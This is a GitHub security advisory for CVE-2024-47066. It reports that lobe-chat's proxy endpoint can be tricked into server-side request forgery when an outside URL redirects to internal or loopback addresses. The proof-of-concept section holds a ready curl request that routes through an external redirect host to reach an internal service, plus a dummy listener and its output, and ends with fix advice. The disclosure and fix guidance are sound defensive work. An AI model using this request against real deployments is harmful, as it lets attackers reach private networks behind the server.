# [M] lobe-chat implemented an insufficient fix for GHSA-mxhq-xw3g-rphc (CVE-2024-32964)

## Summary
Severity: Medium
Advisory: GHSA-3fc8-2r3f-8wrg
CVE: CVE-2024-47066
CWE: CWE-918
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:L/A:H (CVSS_V3)
Published: 2024-09-23
Source: https://github.com/advisories/GHSA-3fc8-2r3f-8wrg
Type: github-advisory

## Affected
- npm: `@lobehub/chat` — affected >=0 <1.19.13

## Details
### Summary
SSRF protection implemented in https://github.com/lobehub/lobe-chat/blob/main/src/app/api/proxy/route.ts does not consider redirect and could be bypassed when attacker provides external malicious url which redirects to internal resources like private network or loopback address.

### PoC
1. Run lobe-chat in docker container. In my setup lobe-chat runs on 0.0.0.0:3210;

2. Create file dummy-server.js with the following content:
```
var http = require('http');
console.log("running server");
http.createServer(function (req, res) {
  console.log(req.url);
  res.writeHead(200, {'Content-Type': 'text/html'});
  res.end();
}).listen(3001, 'localhost');

```
And run 
```
node dummy-server.js
```
as an example server inside of container [1] (or in containers private network).

3. Run in terminal to perform request to lobe-chat instance from [1]

```
curl --path-as-is -i -s -k -X $'POST' \
    -H $'Host: 0.0.0.0:3210' -H $'Accept-Encoding: gzip, deflate, br' -H $'Referer: http://0.0.0.0:3210/settings/agent?agent=&session=inbox&tab=' -H $'Content-Type: text/plain;charset=UTF-8' -H $'Content-Length: 74' -H $'Origin: http://0.0.0.0:3210' -H $'Connection: keep-alive' -H $'Priority: u=0' \
    -b $'LOBE_LOCALE=en-EN; LOBE_THEME_PRIMARY_COLOR=undefined; LOBE_THEME_NEUTRAL_COLOR=undefined' \
    --data-binary $'http://130.193.49.129:8090/redirect?url=http://localhost:3001/iamssrf_1337' \
    $'http://0.0.0.0:3210/api/proxy'
```

where body contains url of server which redirects to internal network (in my case it redirects according url parameter).

4. Observe in output of [2]
```
running server
/iamssrf_1337
```

5. Attacker is able to perform SSRF attacks against lobe-chat despite https://github.com/lobehub/lobe-chat/blob/main/src/app/api/proxy/route.ts#L26 check.

### Fix recommendations:
1. Disable redirects - lobe-chat should consider explicitly disable redirects. 
2. If redirects support is required, perform check before each http request.

### Impact
https://portswigger.net/web-security/ssrf

## References
- https://github.com/lobehub/lobe-chat/security/advisories/GHSA-3fc8-2r3f-8wrg
- https://github.com/lobehub/lobe-chat/security/advisories/GHSA-mxhq-xw3g-rphc
- https://nvd.nist.gov/vuln/detail/CVE-2024-47066
- https://github.com/lobehub/lobe-chat/commit/e960a23b0c69a5762eb27d776d33dac443058faf
- https://github.com/lobehub/lobe-chat
- https://github.com/lobehub/lobe-chat/blob/main/src/app/api/proxy/route.ts
